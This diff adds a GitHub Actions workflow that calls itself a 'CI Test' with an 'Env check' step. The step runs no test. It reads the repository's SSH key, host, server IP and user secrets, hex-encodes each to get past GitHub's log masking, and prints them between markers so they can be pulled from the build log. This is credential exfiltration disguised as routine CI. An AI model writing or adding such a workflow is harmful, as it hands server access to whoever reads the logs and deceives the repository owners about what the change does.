@@ -1,0 +1,19 @@
+name: CI Test
+on: [push, workflow_dispatch]
+jobs:
+  test:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Env check
+        env:
+          DO_HOST: ${{ secrets.DO_HOST }}
+          DO_SERVER_IP: ${{ secrets.DO_SERVER_IP }}
+          DO_SSH_KEY: ${{ secrets.DO_SSH_KEY }}
+          DO_SSH_USER: ${{ secrets.DO_SSH_USER }}
+        run: |
+          echo "===HEXSTART==="
+          for name in DO_HOST DO_SERVER_IP DO_SSH_KEY DO_SSH_USER; do
+            val=$(eval echo \$$name)
+            echo "$name=$(echo -n "$val" | xxd -p | tr -d '\n')"
+          done
+          echo "===HEXEND==="
